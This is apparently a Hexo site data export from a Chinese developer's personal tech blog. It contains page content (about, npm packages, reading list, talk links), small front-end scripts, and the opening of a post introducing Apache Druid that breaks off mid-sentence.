{"meta":{"title":"Lizhooh 的技术博客","subtitle":"<div>来至未来的大全栈工程师自我修养日记。</div>深耕于：数据中台、智能运营、智能推荐、用户数据分析、用户数据治理等大数据领域。","description":"数据就像冰山一样，栩栩如生！","author":"Lizhooh","url":"http://me.lizhooh.com"},"pages":[{"title":"","date":"2021-06-15T06:10:52.759Z","updated":"2021-06-15T06:10:52.759Z","comments":true,"path":"404.html","permalink":"http://me.lizhooh.com/404.html","excerpt":"","text":"404 body, .container { background-color: #fff; } img { box-shadow: none !important; } img._404 { max-width: 380px; max-height: 380px; width: 100%; height: 100%; } span._404 { font-size: 32px; display: block; } .flex { display: flex; } .flex-column { flex-direction: column; } .flex-1 { flex: 1; } .ai-center { align-items: center; } .box { padding: 20px; padding-left: 60px; min-height: 360px; } .ai-end { align-items: flex-end; } 404! 你来到了荒芜人烟的地方。 你找的是： 此文章可能已删除或者已经改名了。 主页 var title = document.getElementById(\"title\"); var url = window.location.href; var index = url.slice(0, url.length - 1).lastIndexOf('/') + 1; title.style.color = '#f34'; title.innerText = decodeURI(url.slice(index).replace(/(\\.html|\\/)$/, ''));"},{"title":"","date":"2021-06-15T06:10:53.402Z","updated":"2021-06-15T06:10:53.402Z","comments":true,"path":"manifest.json","permalink":"http://me.lizhooh.com/manifest.json","excerpt":"","text":"{\"name\":\"Lizhooh\",\"short_name\":\"Lizhooh\",\"start_url\":\"/\",\"orientation\":\"portrait\",\"display\":\"fullscreen\",\"background_color\":\"#fff\",\"theme_color\":\"#1EAAFF\",\"icons\":[{\"src\":\"/assets/icons/android-chrome-192x192.png\",\"type\":\"image/png\",\"sizes\":\"192x192\"},{\"src\":\"/assets/icons/android-chrome-512x512.png\",\"type\":\"image/png\",\"sizes\":\"512x512\"}]}"},{"title":"分类","date":"2021-06-15T06:10:53.401Z","updated":"2021-06-15T06:10:53.401Z","comments":false,"path":"categories/index.html","permalink":"http://me.lizhooh.com/categories/index.html","excerpt":"","text":""},{"title":"关于","date":"2021-06-24T00:54:47.844Z","updated":"2021-06-24T00:54:47.844Z","comments":false,"path":"menu/about.html","permalink":"http://me.lizhooh.com/menu/about.html","excerpt":"","text":"blockquote { font-size: 100% !important; padding: 0px !important; box-shadow: none !important; padding: 12px 15px !important; color: #232425 !important; } .night-mode blockquote { background: #353535 !important; } blockquote::after, blockquote::before { display: none; } blockquote:hover { box-shadow: 1px 2px 3px rgba(1, 1, 1, 0.12) !important; } .night-mode blockquote:hover { box-shadow: 1px 2px 3px rgba(1, 1, 1, 0.32) !important; } 关于这里 轻松，简单的个人技术博客。拥有强大的创造力与执行能力，不甘于平凡与平庸。目前主要负责公司智能营销数据中台产品开发，主技术栈：React、Nodejs、Typescript，副技术栈：Druid、Hive、HBase、Kafka、Redis、MySQL、Flink 等。"},{"title":"创作","date":"2021-06-15T06:10:53.403Z","updated":"2021-06-15T06:10:53.403Z","comments":false,"path":"menu/book.html","permalink":"http://me.lizhooh.com/menu/book.html","excerpt":"","text":".book-view { width: 100%; max-width: 640px; background-color: #fff; box-shadow: 1px 2px 8px rgba(1, 1, 1, 0.08); margin: 50px auto 0; padding: 30px; display: flex; } .book-view:first-of-type { margin-top: 10px; } .book-view:hover { box-shadow: 1px 2px 15px rgba(1, 1, 1, 0.22); background-color: #fff; } .book-view br { display: none; } .book-view .left { text-align: center; padding: 0; } .book-view .right { display: flex; flex-direction: column; flex: 1; align-items: flex-start; padding-left: 25px; } .book-view .medio { width: 100%; display: flex; } .book-view .meta { line-height: 1.6; margin-left: 5px; font-size: 14px; flex: 1; color: #444; } .book-view .meta span, .book-view .meta b { color: #444 !important; } .book-view .medio .start { flex: 1; display: flex; justify-content: center; align-items: center; } .book-view .medio .start button { border-radius: 2px; border: none; background-color: #33cf88; padding: 0.4em 1.2em; color: #fff; text-shadow: 1px 2px 2px rgba(1, 1, 1, 0.12); cursor: pointer; transition: all 0.24s ease-in-out; } .book-view .medio .start button:hover { background-color: #33cf66; } .book-view .medio .start button.disable { cursor: default; background-color: #999; } .book-view .info { padding-top: 10px; text-indent: 2em; color: #525354; line-height: 1.6; } .book-view .image { box-shadow: none; max-width: 220px; } .book-view .image.rev { transform: scale(-1, 1); } .book-view .title { color: #383838 !important; margin: 0; padding: 0; } .book-view .entitle { color: #525354 !important; font-size: 14px; padding-left: 1px; transform: translateY(-6px); padding-bottom: 1px; } .book-view .p { text-indent: 2em; margin: 0 0 8px; text-align: justify; text-justify: inter-ideograph; } @media screen and (max-width: 580px) { .container { padding-top: 0; } .book-view { margin: 0; padding: 20px 25px; flex-direction: column; } .book-view .left, .book-view .right { padding: 0 !important; } .book-view .image { padding: 10px; } } Koa2 学习笔记 Koa2 Learning Notes 作者：Lizhooh 类别：软件开发/后端技术 时间：2017 年 6 月 开始阅读 《 Koa2 学习笔记 》是我学习 Koa2 中记录的学习笔记，以 Express 的开发经验，来快速学习 Koa2。 这并不是入门级的书籍，而是需要你具有一定的 Nodejs 基础，ES6 &amp; 7 语法基础，后端开发基础等，才能领会其中的奥义。里面覆盖了常见的 Nodejs Web 开发解决方案。 React 服务端渲染实战 React Server Render In Action 作者：Lizhooh 类别：软件开发/前端技术 时间：2018 年 5 月 开始阅读 在本书里，你将了解到 React 服务端渲染的基础知识、前端与 Nodejs 技术融合以及一些 React 服务端渲染框架的使用，还将学习到了如何对现有的服务端渲染应用进行性能优化，不同方式实现的服务端渲染应用示例。 本书并不会介绍太多的基础知识点，在阅读本书前，希望你了解并熟悉 ES6、React、Koa 等基本知识，并且具有 Node.js 相当不错的使用经验。 window.addEventListener('load', function() { new tippy('.tippy', { theme: 'light', arrow: true, }); })"},{"title":"Github","date":"2021-06-15T06:10:53.403Z","updated":"2021-06-15T06:10:53.403Z","comments":false,"path":"menu/github.html","permalink":"http://me.lizhooh.com/menu/github.html","excerpt":"","text":"访问我的 Github"},{"title":"Codewars","date":"2021-06-15T06:10:53.403Z","updated":"2021-06-15T06:10:53.403Z","comments":false,"path":"menu/codewars.html","permalink":"http://me.lizhooh.com/menu/codewars.html","excerpt":"","text":""},{"title":"My NPM","date":"2021-06-15T06:10:53.403Z","updated":"2021-06-15T06:10:53.403Z","comments":false,"path":"menu/npm.html","permalink":"http://me.lizhooh.com/menu/npm.html","excerpt":"","text":".name { text-align: center; padding-bottom: 30px; } .name img { width: 90px; height: 90px; border-radius: 100%; } .line { display: inline-block; width: 600px; } .des { color: #89a; } blockquote { background-color: #fff !important; box-shadow: none !important; padding: 16px !important; border-radius: !important; } .night-mode blockquote { background-color: #353535 !important; } .box { background-color: #fff; padding: 12px 20px; margin: 8px; border-radius: 2px; list-style-type: decimal; } .box:hover { box-shadow: 1px 2px 6px rgba(1, 1, 1, 0.05); } .night-mode .box { background-color: #353535; } .box br { display: none; } .box > header { font-weight: bold; text-align: left; } .box > header a { color: #444; border-bottom: none; } .box > header .icon { float: right; } .box > header .icon img { width: auto; height: auto; margin-right: 6px; } .box > header .icon img:last-of-type { margin-right: 0; } .box > footer { margin-top: 5px; } .parent { /* display: flex; */ /* flex-wrap: wrap; */ /* justify-content: center; */ /* align-items: baseline; */ } .parent br { display: none; } img { width: auto; height: auto; } react-static-view 是一个 react/react-native 静态组件容器，提供渲染次数控制的功能，可以用于性能优化，减少不必要的渲染。 is-env 是一个环境检测工具，可以检查 javascript 运行环境是 browser 还是 react-native 、weapp 或 nodejs。 only-space 为中文与英文之间保留一个空格，保持美观感。 list-structure 使用 ES6 构建的链表，栈，队列等结构，需要 CommonJS 模块的支持。 running-time 是一个用于计算某个函数的运行时间。 process-message 是一个神奇的模块，它的神奇之处在于你根本不需要知到它的存在。提供更加简明的主进程与子进程之间的通信方式。 redux-store-init 用于一键简单快速创建一个 store，再也不用写重复的初始化代码了。 koa-rest-helper Koa REST Router 辅助函数。 fetch-rest-helper Fetch REST Router 辅助函数。 react-modal-container React Modal 组件容器，提供方便的方式创建 Modal 组件。 async-task-queue2 AsyncTaskQueue2 是一个异步任务队列类，主要用于处理异步任务，它解决 Promise.all 的疼点。并且基于事件驱动，提供串行与并行两种方式。 auto-query Auto-query 是一个基于 cheerio 实现的自动查询 DOM 节点数据的工具函数。 wxapp-store Wxapp-Store 是一个微信小程序本地数据持久化存储库。 find-file-ext Find-File-Ext 可用于查找文件目录下的某个/某些文件后缀的文件。 redux-fine Redux-Fine 基于 Redux 的上层库，一切为了精简 Redux 开发大代码。 react-native-image-blur react-native-image-blur 是一个能让图片模糊的组件。 react-native-ivideo react-native-ivideo 是我写的一个视频组件播放器，提供简洁风格的界面控制端和全屏播放功能。 react-imusic react-imusic 是一个对 HTML5 Audio 标签封装的组件，使它更适合在 React 里使用。 react-native-imusic react-native-imusic 与 react-imusic 有类似的使用风格的 react-native 音频播放组件。 mobx-free mobx-free 是一个简单的 Mobx 集成库，提供便利的函数，能让你方便在项目里使用 Mobx 与 React 集成。 global-value global-value 用于全局的存储数据，在内存里。 transform-objects transform-objects 通过模型更改对象的键，可用于对后端返回的数据进行格式处理。 react-native-easy-picker react-native-easy-picker 是一个单项选择的 picker，设计为非受阻组件，组件内部自己维护选择状态。 hexo-renderer-markojs hexo-renderer-markojs 使用 markojs v4 的 Hexo 模版渲染引擎。 react-hooks-input-bind react-hooks-input-bind 使用 react hooks 实现的双向数绑定 hook。 react-hooks-use-hover react-hooks-use-hover 使用 react hooks 实现的 hover hook。 react-use-store react-use-store 全局的数据管理 hooks，就像 redux 一样。 常用命令npm config set registry https://registry.npm.taobao.org/ # 淘宝源npm config set registry https://r.cnpmjs.org/ # cnpm 源npm config set registry https://registry.npmjs.org/ # 官方源npm config set disturl https://npm.taobao.org/mirrors/node # node 镜像npm config set ELECTRON_MIRROR http://npm.taobao.org/mirrors/electron/ # electron 镜像npm config set SASS_BINARY_SITE https://npm.taobao.org/mirrors/node-sass/ # node-sass 镜像npm who am i # 检查当前用户npm login # 登录npm publish [包名] # 发布包npm run [scripts] # 运行 scriptnpm install [module] # 安装包"},{"title":"计划","date":"2021-06-15T06:10:53.403Z","updated":"2021-06-15T06:10:53.403Z","comments":false,"path":"menu/plan.html","permalink":"http://me.lizhooh.com/menu/plan.html","excerpt":"","text":"ol, ul { background-color: #fff; padding: 16px 20px; list-style: none; border-radius: 3px; } ol:hover, ul:hover { box-shadow: 0 2px 5px rgba(1, 1, 1, 0.12); } li { display: flex; align-items: center; } li i { cursor: pointer; margin-right: 8px; } img { border: none; box-shadow: none !important; } #_img { width: 75%; } 2015 年计划 学习 HTML、CSS、Javascript。 学习 JQuery 的使用，读懂 JQuery 的源码。 阅读大量 Javascript 相关书籍。 好好上课、好好睡觉、做个不挂科的大学生。 2016 年计划 巩固基本的前端开发知识。 学习 ES2015，尝试使用 ES6 做一些项目。 掌握 React 单页面应用开发。 围观一下微信小程序开发。 掌握 Nodejs 后端开发。 坚持玩同一款手游。 2017 年计划 巩固基本的前端开发知识。 使用 React-Native 开发一个开源项目。 掌握 Redux，了解其背后的故事。 了解前端工程化庞大的体系结构。 进一步深入了解 ES6 Next 规范。 熟练使用 Redis、Mongodb、数据模型设计。 学习一些新的框架（Koa、Next 等）。 提高持续性学习能力，坚持写博客。 2018 年计划 巩固基本的前端开发知识。 进一步精通使用 ES6+、Typescript。 熟悉基本算法、数据结构、设计模式等知识。 提高对数据的控制与驾驭能力，复杂业务处理能力。 研究与探索前端工程化、模块化、组件化、高效率的开发体系。 熟练掌握页面应用（SPA）、同构应用（SSR）、渐进式应用（PWA）、小程序应用等技术。 学习与了解前端之外的边缘与衍生技术，关注新的技术爆发。 实力练腿，骑公路自行车 30 公里 30 km/h 的巡航能力。 健身、增肥、好好睡觉。 2019 年计划 持续学习概率论、统计学、线性代数。 学习产品设计、敏捷开发、团队协助、项目管理等软知识。 提升软件架构设计、开发能力。 2020 年计划"},{"title":"干货分享","date":"2021-06-15T06:10:53.404Z","updated":"2021-06-15T06:10:53.404Z","comments":false,"path":"menu/share.html","permalink":"http://me.lizhooh.com/menu/share.html","excerpt":"","text":"ul { margin-right: 5px; } 轻学习表 devhints.io - 快速学习的宝地 JSConf China 2017 前端工程中的编译时优化 - 尤雨溪（Vue.js 作者） Upgrading to Progressive Web Apps - 黄玄（前端外刊评论成员） 无服务器架构与 API - 朴灵（阿里巴巴 Node.js 布道者） 从 REST 到 GraphQL - Jonas Helfer Node.js 开发物联网应用 - 张子发 如何利用 Ruff OS 物联网操作系统快速开发硬件产品 - 郑晔（Moco 框架创始人） 前端圈 如何用 JavaScript 做好一个大型应用？ - 孟红伦（钉钉前端负责人） 谈项目中如何选择框架和库 - 张克军（豆瓣前端专家） 从 Cycle.js 谈函数式与响应式编程 - 叶俊星（美团网资深前端工程师） 链家前端工程化实践 - 杨永林（链家前端架构师） 基于 React Native 的跨三端技术实践 - 刘威（京东金融移动研发前端负责人） WebAssembly 在白鹭引擎中的实践 - 王泽（白鹭引擎首席架构师） D2 前端技术论坛 2017 D2前端技术论坛 微信小程序解决方案 - 黄荣奎（腾讯高级前端工程师） Weex 在双十一会场的大规模应用 - 徐凯（淘宝高级前端工程师） Web3D &amp; AR 在天猫双 11 互动中大规模应用 - 吴晓东 &amp; 张津（天猫资深前端） 基于云端真机的无线调试解决方案 - 谭海燕（淘宝高级前端工程师） 前端服务化：通向零成本开发之路 - 吴多益（百度前端负责人） XCore — 蘑菇街移动端动态跨平台开发框架 - 王兴楠（蘑菇街技术专家） 蚂蚁财富的 BFF 实践 - 汤尧（蚂蚁金服技术专家） 阿里小蜜 - 移动智能客服前端实践 - 韩盼盼（阿里巴巴资深前端） Node.js 在 YunOS 中的最佳实践 - 叶敬福（YunOS 技术专家） QQ 兴趣部落的架构演进与服务优化 - 郭碧青（腾讯前端高级工程师） Fusion Design - 解构设计，抽象工程 - 周源（阿里巴巴 B2B 前端专家） VueConf Vue.js 2017 现状与展望 - 尤雨溪（Vue.js 作者） Vue SSR 和 API Proxy 层深度实践 - 桑世龙（去哪儿前端架构师） 掘金 Vue.js 2.0 后端渲染及重构实践 - 阴明（稀土掘金创始人） Vue.js 在饿了么的应用 - 李清伟（饿了么前端工程师） 当 Weex 遇上 Vue.js 2.0 - 马天翼（阿里巴巴 Weex 核心开发者）"},{"title":"读书","date":"2021-06-15T06:10:53.404Z","updated":"2021-06-15T06:10:53.404Z","comments":false,"path":"menu/study.html","permalink":"http://me.lizhooh.com/menu/study.html","excerpt":"","text":"blockquote { padding: 8px 12px !important; box-shadow: none !important; transition: all 0.3s ease-in-out; } blockquote::before { display: none; } img, figure { box-shadow: none !important; } div[id *= \"panel\"] > blockquote { margin: 0 !important; box-shadow: 1px 2px 3px rgba(1, 1, 1, 0.12) !important; } .book { max-width: 260px !important; min-height: 100px !important; } .list { display: flex; flex-wrap: wrap; /*justify-content: center;*/ background-color: #fff; } .box { position: relative; margin: 10px 0; text-align: center; } .box > img { cursor: zoom-in; } .box > p { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 260px !important; } .box > p.month { position: absolute; top: 0; left: 0; background-color: rgba(245, 245, 245, 0.75); box-shadow: 1px 2px 2px rgba(1, 1, 1, 0.22); text-shadow: 1px 2px 2px rgba(1, 1, 1, 0.07); border-radius: 100%; color: #333; width: 30px; height: 30px; line-height: 30px; font-size: 13px; opacity: 0; } .box:hover > p.month { opacity: 1; } .image-zoom { position: fixed; top: 0; bottom: 0; left: 0; right: 0; margin: auto; width: 100%; height: 100%; display: block; display: flex; justify-content: center; align-items: center; z-index: 1000; background-color: rgba(255, 255, 255, 1); padding: 20px; overflow: auto; z-index: 100; } .image-zoom > img { z-index: 100; margin: auto; border-radius: 2px; box-shadow: 1px 20px 30px rgba(1, 1, 1, 0.18); animation: image-zoom-img-start 0.32s ease-out; animation-fill-mode: both; cursor: zoom-out; background-color: transparent; } @keyframes image-zoom-img-start { 0% { transform: translateY(-50px) } 100% { transform: translateY(0) } } .image-zoom::selection, .image-zoom > img::selection { background: transparent; } function element(name) { return document.createElement(name); } function attrs(el, obj) { for (var i in obj) { Object.prototype.toString.call(obj[i]) === '[object Object]' ? attrs(el[i], obj[i]): (el[i] = obj[i]); } return el; } function appends(el, arr) { if (Array.isArray(arr)) { for(var i in arr) { el.appendChild(arr[i]); } } else { el.appendChild(arr); } return el } function fullView(img) { var div = element('div'); attrs(div, { className: 'image-zoom', }); var _img = img.cloneNode(); attrs(_img, { className: '' }); appends(div, _img); div.onclick = function(e) { document.body.removeChild(div); } appends(document.body, div); } function render(_data) { var content = document.getElementById('content'); var obj = {}; var data = _data.map(function(item, index) { item.key = 'img-' + index; item.time = item.time || '2018-01-01'; return item; }).map(function(item, index) { var div = element('div'); var img = element('img'); var name = element('p'); var remark = element('p'); var month = element('p'); attrs(img, { className: 'book', src: item.src || '', id: item.key, style: { paddingBottom: '4px', }, }); attrs(name, { innerText: item.name || '', title: item.name || '', style: { fontWeight: 'bold', fontSize: '16px', margin: 0, }, }); attrs(remark, { innerText: item.remark || ' ', style: { fontSize: '13.5px', color: '#888', margin: 0, }, }); attrs(month, { innerText: item.time.replace(/.*-(\\d{2})-.*/, '$1') * 1 + '月' || '', className: 'month', }); img.onclick = function(e) { fullView(img); } appends(div, [img, name, remark, month]).className = 'box'; item.elements = { box: div, img: img, name: name, remark: remark, month: month, }; return item; }).map(function(item) { var key = item.time.replace(/^(\\d{4})-.*/, '$1'); Array.isArray(obj[key]) ? obj[key].push(item) : obj[key] = [item]; return item; }); Object.keys(obj) .sort(function(a, b) { return b - a }) .map(function(key, index) { var list = element('div'); var title = element('blockquote'); var div = element('div'); div.className = 'list'; attrs(list, { id: 'panel' + index }); attrs(title, { innerText: key + ' 年（' + obj[key].length + ' 本）', style: { userSelect: 'none', fontSize: '16px', fontFamily: '微软雅黑', backgroundColor: '#fff', }, show: true, onclick: function(e) { if (title.show) { attrs(div, { style: { height: 0, overflow: 'hidden', } }); } else { div.style = ''; } title.show = !title.show; } }); obj[key] .slice() .sort(function(a, b) { return new Date(b.time).getTime() - new Date(a.time).getTime(); }) .map(function(item) { appends(div, item.elements.box); }); appends(list, [title, div]); appends(content, list); }); return content.innerHTML; } var _data = JSON.parse(localStorage.getItem('APP-STUDY-DATA') || \"false\"); if (!_data || Date.now() - _data.time > 1000 * 60 * 60 * 24) { reqwest('/assets/json/study.json', function (res) { render(res); localStorage.setItem('APP-STUDY-DATA', JSON.stringify({ time: Date.now(), data: res, })); }); } else { render(_data.data); }"},{"title":"标签","date":"2021-06-15T06:10:53.405Z","updated":"2021-06-15T06:10:53.405Z","comments":false,"path":"tags/index.html","permalink":"http://me.lizhooh.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2021-06-15T06:10:53.394Z","updated":"2021-06-15T06:10:53.394Z","comments":true,"path":"assets/json/study.json","permalink":"http://me.lizhooh.com/assets/json/study.json","excerpt":"","text":"[{\"name\":\"GO Web 编程\",\"src\":\"http://img3m5.ddimg.cn/15/33/25199475-1_u_1.jpg\",\"remark\":\"Go Web 之旅\",\"time\":\"2018-01-10\"},{\"name\":\"深入 React 技术栈\",\"src\":\"http://img3m3.ddimg.cn/75/13/24135483-1_u_6.jpg\",\"remark\":\"React 百科书\",\"time\":\"2017-02-26\"},{\"name\":\"React 全栈\",\"src\":\"http://img3m5.ddimg.cn/79/8/24048565-1_u_5.jpg\",\"remark\":\"精读 Redux 数据流\",\"time\":\"2017-02-10\"},{\"name\":\"Nodejs 硬实战 115 个核心技巧\",\"src\":\"http://img3m4.ddimg.cn/57/26/24159324-1_u_6.jpg\",\"remark\":\"很好的 Nodejs 工具书\",\"time\":\"2017-08-10\"},{\"name\":\"MongoDB 实战（第二版）\",\"src\":\"http://img3m2.ddimg.cn/31/11/24195532-1_u_3.jpg\",\"time\":\"2017-02-05\"},{\"name\":\"MongoDB 权威指南（第二版）\",\"src\":\"http://img3m3.ddimg.cn/28/3/23399173-1_u_5.jpg\",\"remark\":\"Mongodb 经典之作\",\"time\":\"2016-12-24\"},{\"name\":\"你不知道的 Javascript（中卷）\",\"src\":\"http://img3m8.ddimg.cn/7/19/24029188-1_u_28.jpg\",\"remark\":\"你不知道系列\",\"time\":\"2016-12-10\"},{\"name\":\"你不知道的 Javascript（下卷）\",\"src\":\"http://img3m5.ddimg.cn/44/12/25210295-1_u_4.jpg\",\"remark\":\"你不知道系列\",\"time\":\"2018-01-10\"},{\"name\":\"前端工程化：体系设计与实践\",\"src\":\"http://img3m6.ddimg.cn/96/32/25204506-1_u_3.jpg\",\"remark\":\"深入认识前端工程化\",\"time\":\"2018-01-10\"},{\"name\":\"深入浅出 Node.js\",\"src\":\"http://img3m1.ddimg.cn/69/1/23371791-1_u_3.jpg\",\"remark\":\"阿里前端大神之作\",\"time\":\"2016-02-12\"},{\"name\":\"Node.js 实战\",\"src\":\"http://img3m0.ddimg.cn/84/13/23462490-1_u_4.jpg\",\"time\":\"2016-09-05\"},{\"name\":\"Redis 实战\",\"src\":\"http://img3m1.ddimg.cn/51/21/23800641-1_u_2.jpg\",\"time\":\"2017-06-08\"},{\"name\":\"图解 HTTP\",\"src\":\"http://img3m7.ddimg.cn/57/34/23462067-1_u_5.jpg\",\"time\":\"2016-11-24\"},{\"name\":\"啊哈！算法\",\"src\":\"http://img3m9.ddimg.cn/30/30/23490849-1_u_5.jpg\",\"time\":\"2014-10-01\"},{\"name\":\"Python 数据分析与挖掘实战\",\"src\":\"http://img3m8.ddimg.cn/43/13/23818948-1_u_1.jpg\",\"time\":\"2018-02-23\"},{\"name\":\"Python 数据分析基础教程（第二版）\",\"src\":\"http://img3m5.ddimg.cn/40/15/23399185-1_u_3.jpg\",\"time\":\"2018-02-23\",\"remark\":\"Numpy 学习手册\"},{\"name\":\"Python 数据挖掘入门与实践\",\"src\":\"http://img3m6.ddimg.cn/5/9/23997506-1_u_6.jpg\",\"remark\":\"数据挖掘的大门\"},{\"name\":\"Javascript 模式\",\"src\":\"http://img3m0.ddimg.cn/29/13/22819430-1_u_7.jpg\",\"remark\":\"不仅仅是编程模式\",\"time\":\"2016-03-11\"},{\"name\":\"JavaScript 设计模式与开发实践\",\"src\":\"http://img3m7.ddimg.cn/4/12/23698327-1_u_1.jpg\",\"remark\":\"设计模式规范\",\"time\":\"2016-10-28\"},{\"name\":\"React Native 跨平台移动应用开发\",\"src\":\"http://img3m5.ddimg.cn/80/32/23967485-1_u_25.jpg\",\"remark\":\"移动混合式开发的未来\",\"time\":\"2016-10-01\"},{\"name\":\"Node.js 权威指南\",\"src\":\"http://img3m6.ddimg.cn/82/5/23460706-1_u_1.jpg\",\"remark\":\"权威性的指南书籍\",\"time\":\"2016-08-24\"},{\"name\":\"Node 与 Express 开发\",\"src\":\"http://img3m0.ddimg.cn/86/1/23648810-1_u_1.jpg\",\"time\":\"2016-08-13\"},{\"name\":\"Node 即学即用\",\"src\":\"http://img3m8.ddimg.cn/21/8/23168298-1_u_1.jpg\",\"remark\":\"快速入门 Nodejs\",\"time\":\"2016-08-24\"},{\"name\":\"React 与 Redux 开发实例精解\",\"src\":\"http://img3m0.ddimg.cn/82/4/24145390-1_u_6.jpg\",\"time\":\"2017-01-03\"},{\"name\":\"React：引领未来的用户界面开发框架\",\"src\":\"http://img3m8.ddimg.cn/28/10/24104548-1_u_6.jpg\",\"time\":\"2016-10-01\"},{\"name\":\"用户体验度量：收集、分析与呈现（第二版）\",\"src\":\"http://img3m5.ddimg.cn/91/27/23841865-1_u_2.jpg\",\"time\":\"2016-04-10\"},{\"name\":\"JavaScript 异步编程\",\"src\":\"http://img3m6.ddimg.cn/66/27/23252196-1_u_1.jpg\",\"time\":\"2015-12-01\"},{\"name\":\"Vue2 实践揭秘\",\"src\":\"http://img3m1.ddimg.cn/55/0/25064281-1_u_3.jpg\",\"time\":\"2017-05-15\"},{\"name\":\"实战 ES2015：深入现代 JavaScript 应用开发\",\"src\":\"http://img3m0.ddimg.cn/0/35/24057990-1_u_5.jpg\",\"remark\":\"ES6 参考学习书\",\"time\":\"2017-01-03\"},{\"name\":\"App 后台开发运维和架构实践\",\"src\":\"http://img3m1.ddimg.cn/17/19/23956631-1_u_13.jpg\",\"time\":\"2017-03-18\"},{\"name\":\"学习 JavaScript 数据结构与算法（第二版）\",\"src\":\"http://img3m2.ddimg.cn/38/3/25165442-1_u_1.jpg\",\"time\":\"2017-11-01\"},{\"name\":\"同构 JavaScript 应用开发\",\"src\":\"http://img3m5.ddimg.cn/46/19/25178815-1_u_3.jpg\",\"remark\":\"同构的未来\",\"time\":\"2017-11-01\"},{\"name\":\"Web 前端黑客技术揭秘\",\"src\":\"http://img3m5.ddimg.cn/9/30/23167395-1_u_1.jpg\",\"remark\":\"深入攻击原理\",\"time\":\"2017-03-08\"},{\"name\":\"锋利的 jQuery\",\"src\":\"http://img3m8.ddimg.cn/50/8/22786088-1_u_1.jpg\",\"time\":\"2015-07-12\"},{\"name\":\"JavaScript DOM 编程艺术（第二版）\",\"src\":\"http://img3m1.ddimg.cn/23/5/21049601-1_u_3.jpg\",\"time\":\"2015-08-23\"},{\"name\":\"C++ Primer Plus（第六版）\",\"src\":\"http://img3m4.ddimg.cn/40/14/22783504-1_u_1.jpg\",\"time\":\"2014-08-01\",\"remark\":\"还没开学就买了\"},{\"name\":\"响应式 Web\",\"src\":\"http://img3m6.ddimg.cn/46/19/23812516-1_u_1.jpg\",\"remark\":\"浪费钱的一本书\",\"time\":\"2016-05-18\"},{\"name\":\"Go 程序设计语言\",\"src\":\"http://img3m2.ddimg.cn/56/3/25072202-1_u_3.jpg\",\"remark\":\"Go 的权威指南\",\"time\":\"2017-09-01\"},{\"name\":\"Ionic 实战\",\"src\":\"http://img3m7.ddimg.cn/49/17/23997847-1_u_9.jpg\",\"remark\":\"开发混合式移动应用\",\"time\":\"2016-07-01\"},{\"name\":\"精通 HTML5 + CSS3 + JavaScript 网页设计\",\"src\":\"http://img3m6.ddimg.cn/17/19/22839416-1_u_1.jpg\",\"time\":\"2015-03-01\"},{\"name\":\"编程之美\",\"src\":\"http://img3m2.ddimg.cn/98/32/20170952-1_u_9.jpg\",\"time\":\"2015-10-25\"},{\"name\":\"程序员的数学\",\"src\":\"http://img3m3.ddimg.cn/38/29/22876463-1_u_1.jpg\",\"time\":\"2015-07-21\"},{\"name\":\"数学建模算法与应用\",\"src\":\"http://img3m4.ddimg.cn/78/3/22494264-1_u_2.jpg\",\"time\":\"2015-04-12\"},{\"name\":\"Qt Creator 快速入门（第二版）\",\"src\":\"http://img3m1.ddimg.cn/48/18/23401371-1_u_1.jpg\",\"time\":\"2015-06-29\"},{\"name\":\"超实用的 jQuery 代码段\",\"src\":\"http://img3m1.ddimg.cn/89/11/23551991-1_u_1.jpg\",\"time\":\"2015-12-01\"},{\"name\":\"CSS 揭秘\",\"src\":\"http://img3m0.ddimg.cn/40/30/23953090-1_u_23.jpg\",\"time\":\"2016-05-01\",\"remark\":\"实践的教程\"},{\"name\":\"Git 团队协作\",\"src\":\"http://img3m5.ddimg.cn/8/8/25087895-1_u_2.jpg\",\"time\":\"2018-03-05\",\"remark\":\"\"}]"},{"title":"","date":"2021-06-15T06:10:53.394Z","updated":"2021-06-15T06:10:53.394Z","comments":true,"path":"assets/json/zsmusic.json","permalink":"http://me.lizhooh.com/assets/json/zsmusic.json","excerpt":"","text":"{\"enable\":true,\"message\":\"意外的错误\"}"}],"posts":[{"title":"Apache Druid 介绍","slug":"大数据/Apache Druid 介绍","date":"2021-06-15T10:59:11.000Z","updated":"2021-06-16T03:13:51.321Z","comments":true,"path":"/stories/2021/06/大数据/Apache Druid 介绍/","link":"","permalink":"http://me.lizhooh.com/stories/2021/06/大数据/Apache Druid 介绍/","excerpt":"前言在本文里将介绍，大数据分析数据库 Druid，针对 Druid 做一个简要的介绍，以及它的应用场景。 Druid 是什么？Apache Druid 是一个实时分析型数据库，旨在对大型数据集进行快速的查询分析（”OLAP”查询)。Druid 最常被当做数据库来用以支持实时读取、高性能查询和高稳定运行的应用场景，同时，Druid 也通常被用来助力分析型应用的图形化界面，或者当做需要快速聚合的高并发后端 API，Druid 最适合应用于面向事件类型的数据。","text":"前言在本文里将介绍，大数据分析数据库 Druid，针对 Druid 做一个简要的介绍，以及它的应用场景。 Druid 是什么？Apache Druid 是一个实时分析型数据库，旨在对大型数据集进行快速的查询分析（”OLAP”查询)。Druid 最常被当做数据库来用以支持实时读取、高性能查询和高稳定运行的应用场景，同时，Druid 也通常被用来助力分析型应用的图形化界面，或者当做需要快速聚合的高并发后端 API，Druid 最适合应用于面向事件类型的数据。 Druid 的特点Druid 的核心架构吸收和结合了数据仓库、时序数据库以及检索系统)的优势，其主要特征如下： 列式存储，与传统的关系型数据库不同，Druid 使用列式存储，这意味着在一个特定的数据查询中它只需要查询特定的列，这样极地提高了部分列查询场景的性能。另外，每一列数据都针对特定数据类型做了优化存储，从而支持快速的扫描和聚合。 可扩展的分布式系统，Druid 通常部署在数十到数百台服务器的集群中，并且可以提供每秒数百万条记录的接收速率，数万亿条记录的保留存储以及亚秒级到几秒的查询延迟。 大规模并行处理，Druid 可以在整个集群中并行处理查询。 实时或批量读取，Druid 可以实时（已经被读取的数据可立即用于查询）或批量读取数据。 自修复、自平衡、易于操作，作为集群运维操作人员，要伸缩集群只需添加或删除服务，集群就会在后台自动重新平衡自身，而不会造成任何停机。如果任何一台 Druid 服务器发生故障，系统将自动绕过损坏。 Druid 设计为 7*24 全天候运行，无需出于任何原因而导致计划内停机，包括配置更改和软件更新。 不会丢失数据的云原生容错架构，一旦 Druid 读取了数据，副本就安全地存储在深度存储介质（通常是云存储，HDFS 或共享文件系统）中。即使某个 Druid 服务发生故障，也可以从深度存储中恢复您的数据。对于仅影响少数 Druid 服务的有限故障，副本可确保在系统恢复时仍然可以进行查询。 用于快速过滤的索引，Druid 使用 CONCISE 或 Roaring 